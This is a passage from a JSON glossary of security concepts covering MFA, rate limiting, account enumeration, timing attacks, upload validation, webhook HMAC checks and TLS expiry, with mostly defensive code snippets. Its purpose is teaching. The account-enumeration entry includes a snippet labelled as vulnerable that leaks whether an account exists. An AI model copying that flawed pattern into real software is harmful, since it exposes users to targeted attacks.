        "links": [
            {"title": "OWASP Session Management Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"},
            {"title": "OWASP Session Fixation Attack", "url": "https://owasp.org/www-community/attacks/Session_fixation"}
        ]
    },
    "mfa": {
        "category": "auth-access",
        "difficulty": "beginner",
        "nature": "defense tooling",
        "definition": "Multi-Factor Authentication (MFA) requires users to present two or more independent authentication factors from distinct categories: something you know (password, PIN), something you have (hardware security key, authenticator app TOTP, mobile device), or something you are (biometrics). WebAuthn and FIDO2 provide phishing-resistant MFA by binding authentication cryptographic challenges to the origin domain.",
        "why_matters": "Enforcing MFA stops over 99% of automated credential stuffing and phishing attacks (CISA guidelines). Even if an attacker obtains a database of hashed or plaintext passwords, they cannot authenticate without physical possession of the second factor.",
        "example": "# TOTP Generation (RFC 6238)\nimport pyotp\ntotp = pyotp.TOTP(\"JBSWY3DPEHPK3PXP\")\ncurrent_token = totp.now()  # e.g., '492019'",
        "related": ["brute-force-protection", "openid-connect", "timing-attacks"],
        "links": [
            {"title": "CISA: Multi-Factor Authentication", "url": "https://www.cisa.gov/mfa"},
            {"title": "OWASP Multifactor Authentication Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html"}
        ]
    },
    "brute-force-protection": {
        "category": "auth-access",
        "difficulty": "beginner",
        "nature": "defense technique",
        "definition": "Brute Force Protection consists of defenses deployed at login, password reset, and credential verification endpoints to prevent adversaries from guessing credentials through automated trial-and-error. Controls include IP-based rate limiting, exponential backoff, temporary account lockouts, CAPTCHAs, and anomaly detection. These mechanisms prevent both targeted attacks on single accounts and credential stuffing sprays across millions of users.",
        "why_matters": "Without brute force defenses, attackers run distributed botnets to test credential lists against login endpoints unimpeded, leading to account takeovers and denial-of-service via database CPU exhaustion.",
        "example": "# Express / Redis rate limiter middleware\nconst rateLimit = require('express-rate-limit');\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  message: 'Too many login attempts, please try again after 15 minutes'\n});",
        "related": ["account-enumeration", "mfa", "load-shedding"],
        "links": [
            {"title": "OWASP Credential Stuffing Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html"},
            {"title": "OWASP Blocking Brute Force Attacks", "url": "https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"}
        ]
    },
    "account-enumeration": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "attack technique",
        "definition": "Account Enumeration is a reconnaissance technique where an attacker probes an application's registration, login, or password reset forms to determine whether a specific email or username exists in the user database. Variations in HTTP status codes, error messages (e.g., 'User not found' vs 'Invalid password'), or response timing leak account existence. Defenses require uniform error responses and constant-time processing.",
        "why_matters": "Allows attackers to compile verified target lists of high-value employee or customer accounts before launching targeted spear phishing or credential stuffing campaigns. Privacy regulations like GDPR penalize services that expose user existence to unauthenticated visitors.",
        "example": "# VULNERABLE: Discloses account state\nif not user_exists(email):\n    return \"Error: Email not registered\", 404\n\n# SECURE: Generic constant response\nreturn \"If an account exists with this email, a reset link has been dispatched\", 200",
        "related": ["brute-force-protection", "timing-attacks", "input-validation"],
        "links": [
            {"title": "OWASP Authentication Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"},
            {"title": "PortSwigger Web Security Academy: Username enumeration", "url": "https://portswigger.net/web-security/authentication"}
        ]
    },
    "timing-attacks": {
        "category": "crypto-identity",
        "difficulty": "advanced",
        "nature": "attack technique",
        "definition": "Timing Attacks are side-channel attacks where an adversary measures microsecond differences in the execution time of cryptographic operations, string comparisons, or database lookups to infer secret data. For instance, standard non-constant-time string equality operators terminate at the first mismatched byte, allowing attackers to guess secret tokens byte-by-byte. Mitigation requires constant-time comparison algorithms.",
        "why_matters": "Can leak secret API keys, HMAC signatures, and password hashes over network requests if server response time correlates with prefix matching. Modern cryptographic libraries provide constant-time comparison primitives (e.g. crypto.timingSafeEqual).",
        "example": "# Constant-time comparison in Python\nimport hmac\n\ndef verify_signature(secret_key, user_input):\n    # hmac.compare_digest prevents timing side-channels\n    return hmac.compare_digest(secret_key, user_input)",
        "related": ["webhook-signature-verification", "account-enumeration", "hashing-vs-encryption"],
        "links": [
            {"title": "Python Documentation: hmac.compare_digest", "url": "https://docs.python.org/3/library/hmac.html#hmac.compare_digest"},
            {"title": "OWASP Side Channel Attack", "url": "https://csrc.nist.gov/glossary/term/side_channel_attack"}
        ]
    },
    "file-upload-validation": {
        "category": "web-exploitation",
        "difficulty": "intermediate",
        "nature": "defense technique",
        "definition": "File Upload Validation encompasses verifying the authenticity, content, extension, MIME type, and size of user-uploaded files before storing them. Defenses include inspecting magic byte headers rather than relying on client Content-Type headers, stripping metadata, assigning randomized filenames, storing files outside the web root or on isolated object storage (S3), and serving uploads with restrictive Content-Disposition headers.",
        "why_matters": "Unrestricted file upload vulnerabilities allow attackers to upload executable web shells (.php, .jsp, .aspx) or weaponized SVG files with embedded JavaScript, immediately achieving full remote code execution on the hosting server.",
        "example": "# Inspecting magic bytes in Python\nimport magic\n\ndef validate_upload(file_stream):\n    mime = magic.from_buffer(file_stream.read(2048), mime=True)\n    file_stream.seek(0)\n    if mime not in ['image/jpeg', 'image/png']:\n        raise ValueError(\"Disallowed file format detected: \" + mime)",
        "related": ["path-traversal", "input-validation", "xss"],
        "links": [
            {"title": "OWASP File Upload Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"},
            {"title": "PortSwigger Web Security Academy: File upload vulnerabilities", "url": "https://portswigger.net/web-security/file-upload"}
        ]
    },
    "webhook-signature-verification": {
        "category": "crypto-identity",
        "difficulty": "intermediate",
        "nature": "defense technique",
        "definition": "Webhook Signature Verification is the cryptographic practice of validating incoming HTTP webhook notifications using an HMAC (Hash-based Message Authentication Code) calculated over the request body using a shared secret key. The receiver recalculates the HMAC digest over the raw request payload and performs a constant-time comparison against the signature header (e.g., Stripe-Signature, GitHub X-Hub-Signature-256).",
        "why_matters": "Without signature verification, an attacker can dispatch forged webhook events directly to your callback endpoints, spoofing completed customer payments, GitHub repository events, or account activations.",
        "example": "import hmac, hashlib\n\ndef verify_webhook(raw_payload, secret_key, expected_sig):\n    computed = 'sha256=' + hmac.new(secret_key.encode(), raw_payload, hashlib.sha256).hexdigest()\n    return hmac.compare_digest(computed, expected_sig)",
        "related": ["timing-attacks", "webhook-retries", "hashing-vs-encryption"],
        "links": [
            {"title": "Stripe Documentation: Check webhook signatures", "url": "https://docs.stripe.com/webhooks/signatures"},
            {"title": "GitHub Docs: Validating webhook deliveries", "url": "https://docs.github.com/en/webhooks/using-webhooks/validating-webhook-deliveries"}
        ]
    },
    "tls-certificate-expiry": {
        "category": "crypto-identity",
        "difficulty": "beginner",
        "nature": "concept defense",
        "definition": "TLS Certificate Expiry refers to the cryptographic invalidation of an X.509 transport layer security certificate once its Not After validity timestamp has passed. Modern industry standards (CA/Browser Forum) enforce certificate lifespans of 398 days or fewer, moving toward 90-day lifespans. Automated lifecycle management tools using the ACME protocol (such as Certbot and Let's Encrypt) handle periodic renewal before expiration.",
        "why_matters": "An expired TLS certificate causes immediate service outages: browsers reject connections with prominent security warnings, mobile apps refuse API handshakes due to certificate pinning, and downstream integrations fail across production microservices.",
        "example": "# Check certificate expiry via openssl\nopenssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null | openssl x509 -noout -dates",
        "related": ["hsts", "health-checks", "dns"],
        "links": [
            {"title": "RFC 5280: X.509 PKI Certificate and CRL Profile", "url": "https://datatracker.ietf.org/doc/html/rfc5280"},
            {"title": "Let's Encrypt Documentation", "url": "https://letsencrypt.org/docs/"}
        ]
    }
}
